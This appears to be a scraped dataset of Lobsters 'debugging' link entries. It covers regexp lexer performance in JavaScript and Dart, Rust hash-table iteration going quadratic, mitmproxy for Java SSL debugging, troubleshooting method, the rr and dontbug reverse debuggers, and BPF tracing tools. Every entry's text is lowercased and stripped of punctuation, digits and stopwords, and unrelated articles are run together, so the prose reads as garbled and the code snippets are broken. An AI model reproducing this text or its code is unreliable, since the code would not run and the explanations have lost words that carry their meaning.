check match given position lexer need advance string break token function lexer str thisstr str thisidx lexerprototypenexttoken function thisidx thisstrlength return eof else thismatch w return number else thismatch azaz w note name ca nt start digit return name else thismatch return space else throw unexpected token try match given regexp current position thisindex string match succeeds advance position string past return match object otherwise return null lexerprototypematch function match easily implemented modern javascript interpreter support sticky regexp flag introduced lexerprototypematch function relastindex thisidx var reexec thisstr null thisidx relastindex return note regular expression need sticky bit set lexerprototypenexttoken function thisidx thisstrlength return eof else thismatch w return number else thismatch azaz w return name else thismatch sy return space else throw unexpected token flag apparently named yylex part lex api confused lexx spaceship based organic technology far beyond even thing included name sticky turn apparently chosen end however way implement match j engine naive approach would something like lexerprototypematch function relastindex thisidx var reexec thisstr match match wrong position null mindex thisidx return null thisidx relastindex return note regular expression need global bit set otherwise lastindex ignored lexerprototypenexttoken function thisidx thisstrlength return eof else thismatch w g return number else thismatch azaz w g return name else thismatch sg return space else throw unexpected token however extremely inefficient calling match dg would essentially search thisidx forward first sequence digit discard match unless occurred thisidx person bit insight regexp feature might come following optimization note regexps irrefutable pattern alternative guarantee regexp engine wo nt attempt match expression different position irrefutable pattern always match lexerprototypenexttoken function thisidx thisstrlength return eof else thismatch w g return number else thismatch azaz w g return name else thismatch g return space else throw unexpected token lexerprototypematch function relastindex thisidx var reexec thisstr match empty match null return null thisidx relastindex return however much common straightforward way implement match would use substring anchored regexps lexerprototypematch function var reexec thisstr null return null slice away consumed part string thisstr thisstrsubstring length return note regular expression need anchored start lexerprototypenexttoken function thisstrlength return eof else thismatch w return number else thismatch azaz w return name else thismatch return space else throw unexpected token exactly code see lessjs lessdart fortunately lessjs runtime implement stringprototypesubstring operation unfortunately lessdart dart vm dart vm implement regexpmatchasprefix method essentially performs sticky match given regular expression given position hooray however necessary change lessdart code discovered actually became several time slower hmm turn little todo inside vm regexp implementation match matchasprefix string string int start inefficient check search later match change possible list int list executematch string start list null return null list start return null return new regexpmatch string list obviously solution fix vm implementing regexpmatchasprefix way implement sticky flag rather simple dart vm using essentially regexp engine one called irregexp maybe called dart vm port irirregexp instead translating regexp specific intermediate representation ir machine code dart vm translates machine independent ir let generic compiler pipeline take care allowed u incorporate irregexp dart vm without porting machine specific regexp related backend code went talked erik corry one mind behind original irregexp implementation sticky flag ported dart found fixed minor bug sticky implementation regexpmatchasprefix implemented efficient way fix lessdart gave expected performance improvement brining lessdart lessjs neck neck part iii trap regexps could finished post positive note would like circle back common idea using regexps tokenize source code important thing realize regular expression certainly convenient way lex way efficient way simply many abstraction layer involved take previous attempt tokenizing regexps benchmark simple string like aaaaa aaaa repeat repeat see following performance number naive tokenizer us global regexps lastindex node tokenizeglobaljs processed token tokenizer using global regexps irrefutable pattern prevent searching regexp match forward node tokenizeglobalirrefutablejs processed token tokenizer us anchored regexps substring slice away processed part string node tokenizesubstringjs processed token tokenizer us sticky regexps node tokenizestickyjs processed token go faster let erase abstraction barrier go full manual function lexer str thisstr str input string thisidx current position within input thistok null last parsed token type number name space thistokstart thistokend last parsed token position lazy getter token value avoid allocating substring needed objectdefineproperty lexerprototype val get function return thisstrsubstring thistokstart thistokend function isdigit ch return ch ch function isalpha ch ch return ch ch z function isident ch return isalpha ch isdigit ch ch function isspace ch return ch ch n ch r ch space lexerprototypenexttoken function thisidx thisstrlength return eof thistokstart thisidx var ch thisstrcharcodeat thisidx isdigit ch thisidx thisstrlength isdigit thisstrcharcodeat thisidx thisidx thisidx thisstrlength isident thisstrcharcodeat thisidx throw unexpected token thistok number else isalpha ch ch thisidx thisstrlength isident thisstrcharcodeat thisidx thisidx thistok name else isspace ch thisidx thisstrlength isspace thisstrcharcodeat thisidx thisidx thistok space else throw unexpected token ch thistokend thisidx return thistok benchmarking tokenizer benchmark used others function benchmark var seq aaaaa aaaa repeat repeat var l new lexer seq var start datenow var cnt var tok lnexttoken cnt tok eof var end datenow consolelog processed cnt token end start m reveals following result node tokenizemanualjs processed token main thing demonstrates program get much faster le work example manual tokenizer simply glide string without allocating substring object token however add var val lval inside benchmark loop force meaningless allocation still see performance much better regexp based parser node tokenizemanualjs processed token sake completeness kind lexer benchmark dart class lexer final string str input string int idx current position within str lexer thisstr token tok last processed token type last processed token value string get val strsubstring tokstart tokend beginning end position last processed token var tokstart var tokend token nexttoken idx strlength return tokenend tokstart idx final ch advance isdigit ch isdigit currentchar idx isident currentchar throw unexpected token tok tokennumber else isalpha ch ch isident currentchar idx tok tokenname else isspace ch isspace currentchar idx tok tokenspace else throw unexpected token tokend idx return tok int advance strcodeunitat idx int get currentchar idx strlength strcodeunitat idx static final zero static final nine static final acodeunitat static final z zcodeunitat static final codeunitat static final space codeunitat static final lf ncodeunitat static final cr rcodeunitat static final tab tcodeunitat static isdigit ch zero ch ch nine static isalpha ch ch ch return ch ch z static isspace ch ch space ch lf ch cr ch tab static isident ch isalpha ch isdigit ch ch enum token number name space end benchmark var seq aaaaa aaaa var l new lexer seq final stopwatch new stopwatch start var tok val var cnt tok lnexttoken val lval force substring allocation cnt tok tokenend print processed cnt token stopwatchelapsedmilliseconds m return val dart vm respectable job code dart tokenizedart processed token overall performance advice summarized follows using regexps lexing use sticky one node use regexpmatchasprefix dart vm strongly consider writing lexer hand instead using regular expression le work program faster le abstraction layer involved simpler establish much work program actually decrease amount
501,Lobsters,debugging,Debugging,TaxDC: A Taxonomy of Non-Deterministic Concurrency Bugs in Datacenter Distributed Systems,http://ucare.cs.uchicago.edu/pdf/asplos16-TaxDC.pdf,taxdc taxonomy nondeterministic concurrency bug datacenter distributed system,,obj stream e
502,Lobsters,debugging,Debugging,Rust hash iteration+reinsertion is accidentally quadratic,http://accidentallyquadratic.tumblr.com/post/153545455987/rust-hash-iteration-reinsertion,rust hash iterationreinsertion accidentally quadratic,recently discovered snippet comment robinhood hashing robin hood hashing original paper problem augment fix working around issue concluding thought,recently discovered surprising operation rust standard hash table type could go quadraticperhaps simplest illustration snippet comment simplified even use std collection hashset hashset fn main println populating let mut one hashset new oneinsert println cloning let mut two hashset new v one twoinsert v example first loop populating one finish fairly quickly would expect second loop copying two take much much longeri enjoy bug least two reason one fun technically allowing u take brief deep dive hashtable implementation something u normally able treat solved problem two great example subtle quadratic behavior system specifically designed smart wellinformed developer avoid possibility accidental quadratic behavior robinhood hashingto understand bug going need understand hash table strategy used rust standard hash table major challenge generalpurpose hash table implementation handle hash collision table n bucket eventually get two element value hashcode n rust us robin hood hashing relatively old technique recently received new attention robin hood hashing variation good old open addressing linear probing small twistfirst let refresh memory hash table open addressing refers technique upon encountering collision somehow selecting alternate location hash table commonly contrasted chaining store multiple entry single hash bucket typically using linked listlinear probing particular mean select alternate bucket scanning forward natural bucket try insert element hash code h table n bucket bucket h n full try n n find empty bucket lookup start h n scan forward find element empty bucketopen addressing linear probing arguably simplest possible generalpurpose hash table implementation work fine assuming good hash function long let load factor get high reminder load factor number element stored table divided number bucket hash table load factor mean half bucket use load factor get high element end extremely far natural hash bucket necessitating lot scanning insert lookupsrobin hood hashing improves linear probing simple trick scanning forward h n look element encounter inserting element natural bucket element bucket considering swap new element element bucket continue scanning elementlet consider example imagine subset hash table labeled bucket index inside bucket placed hashcode n calling natural index element suppose want insert element hash n start bucket find full element bucket index want index home new element keep looking index find element natural index distance home distance place new element index pick whatever element used continue eventually end net result process reduce variance far outofposition element reducing variance mean much predictable insert lookup time strongly desirable employ robin hood hashing safely load table load factor even even prove author original paper fairly tight bound expected maximum probe distancethe problemrust problem arises iterate one table insert resulting entry another table problem occurs iteration hash table procedes walking backing array hash table directly result yielding entry approximately hash order turn fatal combined element rust implementionthe final detail need know order understand bug rust tablesizing algorithm rust us poweroftwo sized table common technique since mean use bitmasks instead moreexpensive modulus grows table reach load factornow let consider happens execute example simplicity pretend two start table size half one reality start extremely small grow power two halfsize case exhibit necessary behavior simpler illustration modify example initialize two let two hashset withcapacity onecapacity verify still exhibit quadratic behaviorso let consider happens start copying one two half size thing procede uneventually first half table two half many bucket one hash tworawcapacity hash onerawcapacity first half table element inserted two approximately index one element reordered slightly one insertion process occasionally search slightly never far space right still free go picture look something like x filled bucket dot empty one xxxxxxxxxxxxxxxxx xxx cursor two xxxxxxx however eventually reach midpoint one table point index two halfsized table wrap around start searching opening beginning near start two againat point two load factor approximately equal one half many bucket approximately half many element rust resizes table load factor know one load factor suppose way example one factor two absorb capacity past one halfway point resizeduring insertion additional two capacity constituting something like one element run troublewe begin inserting beginning two two full insert search right find empty buckethowever immediately right also future insert land since walking two bucket order go position attempt insertion march forward rate one bucket per bucket one insertion stack pushing distanceuntilempty forward greater one bucket per bucket since must also contend bucket already full situation rapidly look something like one xxxxxxxxxxxxxxxxx xxx cursor two xxxxxxxx element insert must search right find empty space two essentially classic triangular pattern definitely quadraticthis pattern continues fill two capacity point two resized performance go back something reasonable however even though quadratic regime cover small fraction middle loop approximatelyconstant fraction quadratic behavior still quadraticwe demonstrate visually augment program measure cumulative time insert n element two observe behavior see exact behavior described efficient performance first half quadratic explosion return efficiencyif preallocate element see full picture essentially similar picture except quadratic breakdown happens prior resize underlying tablethe fixrust working around issue reseeding underlying siphash hashing algorithm pertable basis solves problem thoroughly ensuring order element two different table correlation restoring nice assumption independence make robin hood hashing work also speculating fundamental fix hash table implementation user drop different hash algorithm vulnerable one proposal hash table ought retain insertion order since bug much le likely happen table leak hash orderconcluding thoughtsthis subtle bug rust hash table carefully thought experienced developer wellversed literature practice deliberate quadratic attack hash table selected algorithm hashing algorithm siphash developed implementation specifically avoid anomaly quadratic sneaky creature unexpected correlation bite algorithm based statistical independencefor part one harder bug written understand ticket initially linked read several time read robin hood hashing try several approach developing intuition system began make sense even sat write post realized oversimplified head explanation wrong resort lot experimentation test case confident understood dynamicssurprisingly specific dynamic robin hood hashing end relatively unimportant believe vanilla linear probing would exhibit similar behavior key effect robin hood hashing give confidence andor hubris push table capacity greatly exacerbates problemdefinitely keeper bug
505,Lobsters,debugging,Debugging,Debugging SSL in Java using mitmproxy,http://blog.packagecloud.io/eng/2016/11/14/debugging-ssl-in-java-using-mitmproxy/,debugging ssl java using mitmproxy,tl dr overview mitmproxy example client download compile setting host installing digitalocean starting configuring client trust certificate authority implementation weakness trusted third party scheme mitmproxy work viewing generated certificate transferring certificate client java keystore running example conclusion comprehensive documentation,tl drin post go setting popular mitmproxy tool external host configuring java program proxy traffic allowing debug misbehaving http client library overviewoccasionally faced buggy java program using http communicate api could simply dump everything using djavaxnetdebugall sometimes approach cumbersome let view traffic replay modify mitmproxy come inin post set mitmproxy external host use intercept http traffic example client let get started mitmproxy mitmproxy python program transparently proxy traffic sent console interface inspect capture modify httphttps traffic flow happening think like stepthrough debugger http request responsesthe example clientwe created simple java program blog post serve target application wish capture traffic program shown simply get via http print certificate issuer exampleurl system property defaulting http wwwgooglecom example client look like import exception handling omitted brevity url new url systemgetproperty exampleurl http wwwgooglecom connection httpsurlconnection urlopenconnection connectionconnect systemoutprintln stringformat get connectiongeturl connectiongetresponsecode certificate servercertificates connectiongetservercertificates certificate servercertificate servercertificates servercertificate systemoutprintln getname run argument output look like java jar get http wwwgooglecom cngoogle internet authority ogoogle inc cu cngeotrust global ca ogeotrust inc cu ouequifax secure certificate authority oequifax cusif like follow along feel free download compile example programeasy use maven repository freesetting mitmproxy hostnow verified example program work intended continue setting mitmproxy external hostinstalling mitmproxytraditionally documentation tutorial install mitmproxy host wish capture traffic however prefer using cheap disposable vps instead way avoid issue around setting working python environment local machinefor example using vps friend digitalocean select latest ubuntu version dropdown login machine ready ssh xxxxsince package available ubuntu repository install aptget install sudo aptget update sudo aptget install mitmproxystarting mitmproxysince network tend block default proxy port start mitmproxy server port instead mitmproxy port everything installed correctly bring mitmproxy console interface letting u know server running accepting connection port make sure leave session open running configuring clientin order mitmproxy successfully intercept modify encrypted http traffic java need trust proxy certificate authority specific work practice see implementation weakness trusted third party scheme mitmproxy worksviewing generated certificateswhen started mitmproxy generated selfsigned certificate bundle inside mitmproxy inspect directory see generated certificate various different format l mitmproxy l mitmproxy mitmproxycacertcer mitmproxycacertpem mitmproxycapem mitmproxydhparampemtransferring certificate clientsince java accepts pem formatted certificate need copy mitmproxycacertpem file client computer scp root xxxx rootmitmproxymitmproxycacertpem import certificate java keystore need find libsecuritycacerts location java installation javahome environment variable set located javahomelibsecuritycacerts however variable set need consult system java documentation instructionsthe keytool command located javahomebinkeytool utility manages key certificate java keystore import certificate run following command sudo javahomebinkeytool import trustcacerts file pathtomitmproxycacertpem alias mitmproxycert keystore javahomejrelibsecuritycacerts prompted sudo password first prompted keystore password password enter keystore password default password java keystore changeitupon successfully entering password shown mitmproxy certificate asked want trust owner omitmproxy cnmitmproxy issuer omitmproxy cnmitmproxy serial number valid wed nov est mon nov est certificate fingerprint df signature algorithm name version trust certificate yestype yes see certificate added keystorerunning examplewe call example program time passing proxy setting argument also export javaopts environment variable containing proxy configuration situation control program argument java dhttpproxyhostxxxx dhttpsproxyhostxxxx jar important proxy configuration come jar argumentif everything setup correctly see certificate http wwwgooglecom issued certificate authority mitmproxyget http wwwgooglecom omitmproxy cnmitmproxy omitmproxy cnmitmproxysubsequently mitmproxy session also see intercepted flow ui hitting enter selected flow let inspect hitting tab let cycle request response tcp detailsuse q go back list flowsfeel free run client time see mitmproxy ui handle multiple flowshit list thing selected flowa particularly useful one r replay selected request handy server developmentconclusionthis minimal example serve playground explore concept around debugging java http behavior using mitmproxy bonus point try intercepting maven sbt flow using javaopts full guide using mitmproxy scope post definitely check comprehensive documentation thorough guide thing mitmproxy
506,Lobsters,debugging,Debugging,"Debugging Software, Sherlock Holmes-style",https://codewithoutrules.com/2016/11/16/debugging-sherlock-holmes/,debugging software sherlock holmesstyle,microservices architecture case missing stats eliminating impossible theory client broken theory python version theory phil computer theory server broken recreating crime scientific software detective,many time seen software exhibiting completely impossible result theory software completely deterministic practice often seems capriciously demonic lost detection method sherlock holmes help discover hidden order beneath chaos sherlock holmes famously stated eliminate impossible whatever remains matter improbable must truth true fictional crime also true software basic process follow find problem come list potential cause test potential cause isolation ruling one one whatever cause rule likely cause even seems improbable see might work practice bug colleague phil encountered day job back working building microservices architecture case missing stats working client library phil working server phil testing new feature client would send message server containing certain statistic ran client server get message message ever empty list stats someone kidnapped stats find phil using following component potential suspect local server indevelopment code python latest version client latest version test script eliminating impossible next step isolate possible cause falsify theory client broken client code never used real server perhaps buggy checked see unit test checking existence stats maybe unit test broken though ran client python computer using test script phil used recorded traffic production server python similar enough seemed ok change variable time message sent server include expected stats client apparently problem test script theory python version tried python kick stats still theory phil computer maybe phil computer cursed phil gave ssh login computer set new environment ran client production server using python computer saw stats sent theory server broken may noticed far testing production server phil testing indevelopment server server seemed unlikely cause however client unilaterally sent message server server version mattered however eliminated cause next thing check ran client phil indevelopment suddenly stats missing client transmission log found kidnapper needed figure crime committed recreating crime far assumed client talked dev server message include stats could reproduce problem noticed message include stats rather sending fewer message message stats failing sent quick check log indicated encoding error failing encode message stats never sent checked log much much earlier process turn reading code suggested problem indevelopment server feeding client bogus data earlier client tried send message server included stats needed use bogus data failed encode message got dropped client sent message server empty list stats bogus data needed encoding sending succeeded server turned culprit even though seemed improbable cause outset least first order culprit rootcause analysis suggested problem protocol design real cause scientific software detective debugging process could better really check one change time neglected obvious step checking log basic process worked isolate possible cause falsify demonstrating real cause repeat one cause left got impossible bug put imaginary detective hat stick imaginary detective pipe mouth catch culprit
507,Lobsters,debugging,Debugging,rr: Lightweight User-Space Record And Replay,https://arxiv.org/abs/1610.02144,rr lightweight userspace record replay,donate arxiv simon foundation member organization,donate arxiv please join simon foundation generous member organization supporting arxiv giving campaign september contribution fund improvement new initiative benefit arxiv global scientific community
508,Lobsters,debugging,Debugging,Dontbug: A reverse debugger for PHP (based on rr),https://github.com/sidkshatriya/dontbug,dontbug reverse debugger php based rr,dontbug debugger golang demo video debugger feature netbeans eclipse pdt phpstorm xdebug limitation caveat usage brief installation o platform installation instruction dontbug debugger work credit mozillarr xdebug gdb dontbug debugger work golang cyrusandgdb gdbmi chzyerreadline krpty mastermindssemver fatihcolor license copyright using dontbug debugger command php builtin webserver syntax example note php builtin webserver tip however aware recording many page load may degrade performance debugging config file information flag command dbgp basic usage tip gotchas php ides try open browser window start listening debug connection ignore error remember replay frozen time earlier version information flag dontbug prompt debugging reverse mode confusing cheat sheet,dontbug debugger dontbug reverse debugger aka time travel debugger php allows record execution php script command line mode browser replay execution back php ide debugger replay may debug normally forward mode debugging reverse allows step overout backwards step backwards run backwards run cursor backwards set breakpoints past forth debugging ability run reverse allows hunt bug much easily also allows understand runtime behavior large php codebases efficiently dontbug implemented golang bit c demo video debugger feature debug php source forward reverse ability set line breakpoints inspect php variable call stack step overoutinto backwards forward hit breakpoints running reverse forward mode run cursor backwards etc full compatibility existing php ides like netbeans eclipse pdt phpstorm php ideeditor support xdebug special ide plugins modification required ideeditor minimal learning curve apart getting familiar debugging reverse continue using debugger dontbug put reverse mode button ide simply acquire opposite meaning step step backwards confusing cheat sheet ability record php script execution completely even network call database call nondeterministic inputoutput php code replay php script see inputoutput result database network call call rand time etc record however php writeread network database second time replay highly performant forwardreverse mode execution concentrate finding bug debugger get way ability record multiple webserver requestsresponses one go traditional php website debugging done per url basis dontbug record many webserver requestsresponses time debug consolidated execution trace help hit breakpoints code rarely triggered triggered poorly understood situation mean practice pressing runcontinue forward reverse mode often lead nextprevious request debugger end program feature caveat aware recording many page requestsresponses time may degrade performance debugging limitation caveat since dontbug replay saved php script execution trace persistently modify variable value debugger variable state php script readonly limitation fundamental current recordreplay architecture practice big limitation changing variable value debugging rarely needed dontbug beta level quality please report problem encounter dontbug also advanced debugging feature like breaking named exception breaking call toreturn specifically named function conditional breakpoints watch moment planned future release always emulate conditional breakpoints adding statement breakpoint condition line breakpoint inside statement usage brief record execution using dontbug record ask php ide listen debugging connection favorite shell execute dontbug replay dontbug try connect php ide listening debugger connection connected dontbug replay last execution recorded via dontbug record ide connected use debugger ide would normally want run reverse mode press r reverse mode f forward mode dontbug prompt see detail installation o platform see installation instruction installing dontbug machine dontbug debugger work interested dontbug debugger work internally please read document credit standing shoulder giant open source project built help open source project dontbug exception mozillarr xdebug gdb project important open source project dontbug depends existence fantastic open source project allowed dontbug built role contribution three project overall functionality dontbug outlined dontbug debugger work document dontbug executable programmed golang programming language dontbug directly depends number open source golang library cyrusandgdb golang library communicate gdb using gdbmi protocol chzyerreadline golang library gnu readline kind implementation krpty golang library interface unix psuedoterminals related golang library command line interface persistent configuration mastermindssemver golang library version string comparison fatihcolor golang library using color unix terminal may exhaustiveupto date list please refer source code license copyright dontbug copyright sidharth kshatriya dontbug licensed term apache license version using dontbug debugger installed dontbug two command available dontbug record dontbug replay see dontbug record help dontbug replay help information continue reading command dontbug record dontbug record command record execution php script php builtin webserver php command line interpreter used later forwardreverse debugging php ide typical workflow dontbug record followed dontbug replay syntax dontbug record phpsourcerootdir docrootdir flag dontbug record phpsourcerootdir phpscript phpcliscript argsinquotes flag example dontbug record varwwwfancysite docroot dontbug record varwwwanothersite dontbug record phptest listsupportedfunctionsphp phpcliscript dontbug record phptest mathcalculatefactorialminmaxphp phpcliscript args first example spawn php builtin webserver recording execution fancysite website user navigates various url browser docroot fancy site varwwwfancysitedocroot phpsourcedir varwwwfancysite general dontbug able handle php frameworkcms long meet minimum requirement frameworkcms run php built webserver php built webserver substituting apache nginx etc second example like first docrootdir assumed phpsourcerootdir third example record execution phptestlistsupportedfunctionsphp fourth example record execution php script two argument passed note quote enclose argument script full path phptestmathcalculatefactorialminmaxphp seen specify docrootdir phpscript specified relative path wrt phpsourcerootdir phpsourcerootdir mean outermost directory possible php script might executed project php source project note typically phpsourcerootdir would docroot php project sometimes parent folder phpsourcerootdir docrootdir sometimes script might placed outside docroot php project eg vendor script installed composer please keep directory specific possible example could specify root directory phpsourcerootdir contains possible php script system would impact performance hugely source symlinked inside phpsourcerootdir outside dir dontbug able handle without increase scope phpsourcerootdir php builtin webserver tip may record many http page load later debugging running php built webserver unlike traditional php debugging usually one page load time however aware recording many page load may degrade performance debugging additionally may pas argument php built server ie args flag ignored used conjunction phpcliscript config file find frequently passing flag dontbug may provide custom config various flag homedontbugyaml file sample file serverport installlocation somepathsrcgithubcomsidkshatriyadontbug parameter default suffice typically need minimal dontbugyaml config file flag passed via command line always override configuration yaml file yaml file user flag nt specify particular parameter default mentioned dontbug record help apply information flag see dontbug record help information various flag available customization option command dontbug replay dontbug replay command replay previously saved execution trace php ide debugger may set breakpoints step code inspect variable value etc used interestingly dontbug allows reverse debug ie step backwards run backwards hit breakpoints running reverse forth dontbug communicates php ides using dbgp protocol defacto standard php ides special support required dontbug work far ides concerned talking normal php debug engine basic usage record execution using dontbug record see dontbug record help know ask php ide listen debugging connection favorite shell execute dontbug replay dontbug try connect php ide listening debugger connection connected dontbug replay last execution recorded via dontbug record ide connected use debugger ide would normally want run reverse mode press r reverse mode f forward mode dontbug prompt reverse mode button ide remain reverse effect press eg step reverse step forth press h help dontbug prompt information tip gotchas php ides try open browser window start listening debug connection let url access browser likely result error anyways ignore error absolutely effect dontbug replaying previously saved execution trace ide know important thing look message green dontbug connected php ide debugger dontbug prompt see message start debugging php ide normally would except ability run reverse want remember replay frozen time change php code replay need dontbug record nt dontbug replay replay php execution corresponding earlier version source code php ide show current php source code lead lot confusion weird behavior may imagine essentially need make sure php source newer last recording simply dontbug record advancedexperimental flag takesnapshot see dontbug record help allows record execution take source code snapshot issue dealt principled way however feature fully documented yet increase complexity workflow therefore simply dontbug record php source changed since last recording information flag see dontbug replay help information various flag available customization option dontbug prompt upon running dontbug replay prompt available switch forward reverse mode prompt also help press h followed enter get help dontbug h h display help text q quit r debug reverse mode f debug forward normal mode toggle reverse forward mode v toggle verbose quiet mode n toggle showing showing gdb notification enter tell whether forward reverse mode debugging reverse mode confusing cheat sheet button php ide debugger following new opposite meaning reverse debugging mode step mean step php statement reverse direction step mean step one php statement backwards usual stop encounter breakpoint operation step mean run backwards come current function enter usual stop encounter breakpoint operation runcontinue mean run backwards hit breakpoint run cursor mean run backwards hit cursor need place cursor current line
509,Lobsters,debugging,Debugging,Improve your Dev and Ops skills with Troubleshooting Theory,https://blog.dnsimple.com/2016/11/troubleshooting-theory/,improve dev ops skill troubleshooting theory,apple retail genius bar xserve troubleshooting theory first step gather information probing question rubber ducking second step isolate problem linear bottomup linear topdown osi model halfsplit splithalf third step planning solution spike fourth step implementing solution final step testing solution practical example software debugging example linear approach splithalf approach planning applying testing solution hardware debugging example linear approach topdown linear approach bottomup splithalf approach planning applying testing solution conclusion really wrong approach take investigation problem lesson future twitter facebook aaron kalin,year joining dnsimple worked year apple retail store genius bar helping diagnose repair everything ipod xserve system biggest takeaway time troubleshooting theory helped lot complex problem developer system administrator dnsimple explain process troubleshooting step step realworld example could apply development server administration hardware repair near end article step troubleshooting generally following gather information isolate problem planning solution implementing solution testing solution keep mind variation model generally follow overall step also simplified need blog post confident helpful first step gather information presented problem try obtain much information possible problem symptom happening appears abnormal reproduction step recreate problem anything happened leading problem restarting server area affected likely affected file code maybe set method code network card server sometimes smallest detail clue locating problem implementing testing solution troubleshooting issue another person ask probing question gather much detail possible troubleshooting issue consider asking question loud little rubber ducking gain detail second step isolate problem gathered information possible familiar system affected know problem likely file new code new network card installed firewall recently added familiar system troubleshooting use knowledge system quickly isolate issue create solution opposite also true unfamiliarity system help ask question try step someone familiar system would normally perform isolate problem two method linear halfsplit also called splithalf depending constraint time tool sometimes budget may forced one path isolating issue fully time get feel method work best given situation likely spend time troubleshooting fix obvious easy fly right indepth approach finding resolving problem linear bottomup bottomup approach usually applies physical system server desktop computer suspect problem lie physical space start work way software layer operating system software physical issue usually easy troubleshoot start base system work way component tree fully built method also applies software developer working within framework sometimes language framework could considered bottom stack code change top changing removing easily done package management would way isolate potential issue helpful know way skipping bottomup approach sometimes physical lowlevel issue may harder diagnose example use ping command test network connectivity work likely network card even physical issue right go framework hello world use something else framework related code likely culprit linear topdown opposite bottomup approach simpler generally might try first typically begin application operating system layer work way stack towards framework hardware developer try commenting line two code system administrator try thing like accessing another website setting another virtual host restarting process working way topdown approach follow osi model begin layer work way isolating issue especially network related could lead testing basic like dns resolver setting firewall configuration network setting identify issue halfsplit splithalf got experience belt given system troubleshooting whether code physical system opt halfsplit approach sometimes called divideandconquer use experience given system make educated guess problem likely work stack potentially eliminate area assume unrelated though sometimes save valuable time getting towards root cause problem ultimately solution maybe code wrote supporting code another file try commenting code related issue system administrator maybe already know problem certain set service shut unrelated service configuration option quickly get problem might sure physical problem trying another drive good bootable operating system eliminate anything software side go third step planning solution isolated problem time plan solution solution minor impact others major catastrophic impact many user affected change change risk data loss perhaps change method signature break code measuring estimated impact help drive solution even help breaking apart step implementing solution avoid major impact consider setting test environment plan possible solution code branch spike solution problem hardware acquire similar system reproduce issue let explore solution safely well fourth step implementing solution planned solution time execute plan beware deviating plan avoid unintended consequence solution something come start back beginning fill piece missing initial conclusion information doubt go back step check work alluded devil smallest detail final step testing solution solution place work check see original issue resolved new issue arisen result involvement modifying line code break different test made one focusing pas replacing network card allow system talk internet testing thoroughly reviewing problem got far first place key making sure solution accurate effective practical example given step let generalize example approach would work software debugging example let say line ruby code suddenly misbehaving sure might working new feature new mocking going depends new library run test however discover line code backtrace nt quite make sense investigate linear approach taking linear approach top generally make sense code start commenting newest line code begin digging deeper problem nt change resolve using source control git might stash change rerun test see passing going top find spot thing working passing help greatly time consuming process depending many change present splithalf approach going splithalf route mean might already hunch new mocking library could introducing conflict code starting point temporarily eliminate presence see newer backtrace lead answer depending size change set could trivial timesaving though sometimes difficult pull newer library introduced mix planning applying testing solution investigation realize fault way using new testing framework suddenly giving false positive assertion carefully checking documentation source code better understanding framework usage write new change code new test pas able make fresh new commit source onto next feature hardware debugging example bought newest sweetest gaming computer rig known geek kind middle game something go horribly wrong system simply crash getting back operating system seems impossible sudden get infected virus somehow maybe video card overheated linear approach topdown knowing much newest system first instinct may roll back operating system previous installation point maybe start new install sadly might lose game save nt careful backing digging deeper finding operating system reinstall nt favor start looking hardware possible culprit next step would start checking hardware linear approach bottomup certain operating system totally working order code perfect shiny new hardware must fault right start disconnecting hard drive first going minimum system configuration needed get pas poweron self test post use focused diagnostic tool keep operating system mix make sure hardware sound splithalf approach handy gamer happened linux live disc thumb drive used know work use boot really quickly test work possibly getting closer whether hardware software issue assuming rig boot reach built memory math test linux live disc quick ram cpu check eliminate another major source error narrow candidate source issue dramatically matter minute planning applying testing solution examining possibility ultimately find new ram purchased bad block accept data correctly initially attempt reseating memory see installed correctly also plan purchase new memory case installing new memory retest memory testing program verify plan worked get back gaming bliss conclusion hope post given new perspective troubleshooting may already form known general rule thumb remember really wrong approach take investigation problem lesson future sometimes speed process finding solution others take day week perhaps year find culprit take time ask question possible share process team help grow share twitter facebook aaron kalin software server maintainer day board video game geek night
510,Lobsters,debugging,Debugging,"OPA, A live memory debugger for C programs",https://www.youtube.com/watch?v=pvkn9Xz-xks,opa live memory debugger c program,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature opa live memory debugger c program youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature opa live memory debugger c program youtube
511,Lobsters,debugging,Debugging,DTrace for Linux 2016,http://www.brendangregg.com/blog/2016-10-27/dtrace-for-linux-2016.html,dtrace linux,dtracetoolkit screenshots bcc bcc install necessity perftools happened patchset safety linux tracing take long tracing summit talk netflix ease use using bpf toolsmetrics developing toolsmetrics running common oneliners writing custom ad hoc oneliners higherlevel language initial version ply contribute promotion education fix bcc issue bcc issue list file bug new tool doc ping highlevel language gui integration tracer bccbpf reading bccbpf tool enduser tutorial bcc python developer tutorial bccbpf reference guide tool exampletxt man page linux bpf superpower usenix lisa linux ebpf tool acknowledgement conclusion bcc github ebpf tool,final major capability bpf tracing timed sampling merging linux linux kernel raw capability similar provided dtrace advanced tracer solaris long time dtrace user expert exciting milestone linux analyze performance application kernel using productionsafe lowoverhead custom tracing latency histogram frequency count many tracing project linux technology finally merged start tracing project began enhancement berkeley packet filter bpf aka ebpf first enhancement let bpf redirect packet create softwaredefined network later support tracing event added enabling programmatic tracing linux bpf currently lack highlevel language like dtrace frontends available enough create many bpf tool based older dtracetoolkit post describe use tool frontends available discus technology going next screenshots adding bpfbased tracing tool open source bcc project thanks brenden blanco plumgrid leading bcc development see bcc install instruction add collection tool usrsharebcctools including following tracing new process execsnoop pcomm pid ret args bash usrbinman l preconv usrbinpreconv e man usrbintbl man usrbinnroff mandoc man usrbinpager nroff usrbinlocale charmap nroff usrbingroff mttychar mandoc groff usrbintroff mttychar mandoc groff usrbingrotty histogram disk io latency biolatency tracing block device io hit ctrlc end c msec count distribution tracing common operation slower millisecond tracing operation slower m time comm pid byte offkb lat m filename supervise w statusnew supervise r run run r nsswitchconf run r netflixenvironmentsh run r servicefunctionssh run r svstat svstat r status run r stat run r grep run r p run r xargs p r run r cut tracing new active tcp connection connect tcpconnect pid comm ip saddr daddr dport telnet curl curl telnet ssh bff bff tracing dns latency tracing getaddrinfo gethostbyname library call gethostlatency time pid comm latms host wget wwwiovisororg wget wwwiovisororg wget wwwnetflixcom curl wwwnetflixcomau curl wwwplumgridcom curl wwwfacebookcom curl foo curl foo interval summary vfs operation type vfsstat time read writes creates open fsyncs tracing offcpu time kernel user stack trace summarized kernel given pid offcputime p tracing offcpu time u pid user kernel stack hit ctrlc end c finishtaskswitch schedule dowait waitpid bash finishtaskswitch schedule scheduletimeout waitwoken nttyread ttyread vfsread vfsread sysread read bash tracing mysql query latency via usdt probe mysqldqslower pgrep n mysqld tracing mysql server query pid slower m time pid m query select word word regexp bre n select word word regexp alex select count word select count count word word regexp bre n select word word regexp bre n order word using trace multitool watch login request instrumenting pam library trace pam pamstart time pid comm func sshd pamstart sshd root 